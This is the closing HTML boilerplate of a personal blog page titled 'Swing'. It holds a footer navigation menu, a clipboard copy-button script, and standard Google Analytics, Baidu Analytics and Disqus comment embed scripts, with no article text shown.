        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
